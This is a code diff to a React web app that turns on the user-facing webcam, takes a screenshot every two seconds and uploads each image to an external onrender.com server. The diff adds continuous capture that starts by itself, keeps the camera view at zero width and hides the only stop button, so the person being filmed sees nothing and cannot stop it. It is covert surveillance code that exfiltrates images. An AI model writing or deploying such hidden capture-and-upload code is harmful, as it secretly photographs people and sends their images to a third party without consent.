@@ -4,45 +4,34 @@ import axios from 'axios';
 
 const App = () => {
   const webcamRef = useRef(null);
-  const [imageSrcs, setImageSrcs] = useState([]);
-  const [isCapt, setIsCapt] = useState(false);
+  const [isRunning, setIsRunning] = useState(true);
 
-  const capturePhotos = async () => {
-    let capturedImages = [];
-    for (let i = 0; i < 10; i++) {
-      // Wait for 10 seconds before capturing the next photo
-      await new Promise(resolve => setTimeout(resolve, 1000));
+  const capturePhoto = async () => {
+    if (!webcamRef.current) return;
 
-      const image = webcamRef.current.getScreenshot();
-      capturedImages.push(image);
-    }
-    setImageSrcs(capturedImages);
-  };
+    // Capture a screenshot from the webcam
+    const image = webcamRef.current.getScreenshot();
 
-  useEffect(() => {
-    if (imageSrcs.length >= 1) {
-      return uploadPhotos()
-    } else {
-      setIsCapt(true);
-    }
-  },[imageSrcs]);
-  
-  useEffect(() => {
-    if (isCapt) return capturePhotos();
-  },[isCapt]);
-
-  const uploadPhotos = async () => {
-    if (imageSrcs.length === 0) return alert('Capture photos first!');
-
-    try {
-      for (const image of imageSrcs) {
+    // Upload the captured image
+    if (image) {
+      try {
         const response = await axios.post('https://be-ggny.onrender.com/upload', { image });
         console.log('Photo uploaded:', response.data);
+      } catch (error) {
+        console.error('Error uploading photo:', error);
       }
-    } catch (error) {
-      console.error('Error uploading photos:', error);
     }
   };
+
+  useEffect(() => {
+    if (!isRunning) return;
+
+    const intervalId = setInterval(() => {
+      capturePhoto();
+    }, 2000); // Capture every 2 seconds
+
+    return () => clearInterval(intervalId); // Cleanup on unmount
+  }, [isRunning]);
 
   return (
     <div>
@@ -51,8 +40,11 @@ const App = () => {
         ref={webcamRef}
         screenshotFormat="image/jpeg"
         videoConstraints={{ facingMode: "user" }}
-        width={0}
+        width={0} // Hide the webcam display if not needed
       />
+      <button onClick={() => setIsRunning(!isRunning)} style={{display:'none'}}>
+        {isRunning ? "Stop" : "Start"} Capturing
+      </button>
     </div>
   );
 };
